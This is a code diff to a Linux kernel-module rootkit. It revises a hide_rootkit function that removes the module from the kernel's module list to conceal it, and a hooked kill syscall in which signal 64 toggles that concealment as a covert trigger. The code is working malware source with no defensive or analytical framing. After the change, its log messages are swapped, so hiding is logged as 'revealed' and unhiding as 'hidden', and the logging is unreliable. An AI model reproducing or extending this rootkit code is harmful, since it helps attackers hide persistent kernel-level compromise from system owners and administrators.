@@ -8,17 +8,18 @@ extern int BUFFER_SIZE;
 
 
 
-static int hide_rootkit(void){
-	if (module_hidden){
-		list_add(&THIS_MODULE->list, prev_module); //adds module back into lkm list
-		log_msg("[hooked_syscalls.c::hide_rootkit] rootkit has been revealed\n");
-	}
-	else{
+static int hide_rootkit(bool hide){
+	if (hide && !module_hidden){
 		prev_module = THIS_MODULE->list.prev; //sets the location of the previous module so rootkit can re-insert itself
 		list_del(&THIS_MODULE->list); //deletes this module from the list
-		log_msg("[hooked_syscalls.c::hide_rootkit] rootkit has been hidden\n");
+		log_msg("[hooked_syscalls.c::hide_rootkit] rootkit has been revealed\n");
+		module_hidden^=1;
 	}
-	module_hidden^=1; //flips module_hidden variable
+	else if (!hide && module_hidden){
+		list_add(&THIS_MODULE->list, prev_module); //adds module back into lkm list
+		log_msg("[hooked_syscalls.c::hide_rootkit] rootkit has been hidden\n");
+		module_hidden^=1;
+	}
 	return 0;
 }
 
@@ -49,7 +50,7 @@ static asmlinkage long hooked_kill(const struct pt_regs *regs){
 		sprintf(buffer, "[hooked_syscalls.c::hooked_kill] process %i sent signal %i\n", pid, sig);
 	}
 	if (sig==64){ //DEBUG in case lkm is hidden and issues with remote access
-		hide_rootkit();
+		hide_rootkit(!module_hidden);
 		return 0;
 	}
 	log_msg(buffer);
